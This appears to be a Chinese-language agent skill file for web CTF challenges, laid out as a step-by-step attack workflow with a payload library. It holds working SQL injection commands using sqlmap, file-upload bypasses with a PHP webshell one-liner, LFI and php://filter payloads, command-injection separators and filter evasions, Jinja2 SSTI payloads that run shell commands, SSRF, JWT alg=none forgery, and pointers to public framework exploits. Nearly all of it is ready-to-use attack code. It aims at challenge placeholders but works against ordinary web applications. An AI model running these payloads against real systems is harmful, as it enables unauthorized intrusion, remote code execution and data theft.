---
name: web-ctf
description: Web 类 CTF 题的标准攻击流与 payload 库。当题目是 Web 服务、有 URL/端口、或要求攻击 Web 应用时使用。
---

# Web CTF 打法

## 0. 先做侦察（2 分钟）
```bash
curl -sv http://TARGET/          # 看响应头、Server、跳转
whatweb http://TARGET            # 指纹
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
# 看源码：view-source、注释、robots.txt、.git/config、备份文件 index.php.bak / .swp / www.zip
```
题面给的版本号/CMS 名 → 有网直接搜公开漏洞。

## 1. SQL 注入（出现参数 id/cat/uid 先试）
```bash
# 手测
'   "   ')   --+   #   报错即注入
# 上 sqlmap
sqlmap -u "http://TARGET/x.php?id=1" --batch --dbs
sqlmap -u "..." --batch --sql-query="select load_file('/flag')"
# 常见绕过：空格→/**/、union select→union/**/select、引号被过滤→0x十六进制
```

## 2. 文件上传（有上传点就试）
```
后缀绕过：.php5 .phtml .pht .php. .php%00（截断） .php/（路径）
内容绕过：GIF89a;<?php system($_GET[c]);?>（图片马）
.htaccess 绕过：上传 .htaccess 让 .jpg 当 php 解析
上传成功 → 蚁剑/菜刀/一句话连接 → cat /flag
```

## 3. 文件包含 / LFI（page/file/inc 参数）
```
?file=../../../../flag
?file=php://filter/read=convert.base64-encode/resource=flag
?file=/proc/self/environ（写日志 RCE）
?file=php://input + POST <?php system('cat /flag');?>
```

## 4. 命令执行（ping/ip/cmd 参数）
```
| cat /flag     ; cat /flag    && cat /flag    `cat /flag`    $(cat /flag)
过滤空格 → ${IFS} 或 $IFS$9 或 <flag
过滤 cat → tac / more / head / nl / grep -r flag /
```

## 5. SSTI（输入会回显在页面时）
```
探测：{{7*7}}  ${7*7}  <%=7*7%>
Jinja2 读 flag：{{cycler.__init__.__globals__.os.popen('cat /flag').read()}}
{{config.__class__.__init__.__globals__['os'].popen('cat /flag').read()}}
```

## 6. SSRF（有 URL 获取类功能）
```
http://127.0.0.1/flag    file:///flag    gopher:// 打内网 redis/mysql
```

## 7. JWT（token 三段 base64url）
```
解 payload 看角色 → alg=none 去掉签名段 → 弱密钥爆破 → 伪造 admin
```

## 8. 其他常考
- 反序列化：PHP unserialize 链 / Java ysoserial / Python pickle
- 逻辑漏洞：越权（改 id/uid）、验证码绕过、密码重置竞争
- 框架漏洞：ThinkPHP/Struts2/Shiro/Spring 已知 CVE，先 whatweb 指纹后查 exp

**验证习惯**：payload 拿到输出后先 `echo '...' | grep -i flag` 确认，再提交。
